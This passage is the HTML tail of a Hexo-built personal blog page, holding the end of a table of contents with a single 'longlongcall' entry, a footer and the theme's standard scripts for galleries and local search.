class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#longlongcall"><span class="toc-article-text">longlongcall</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
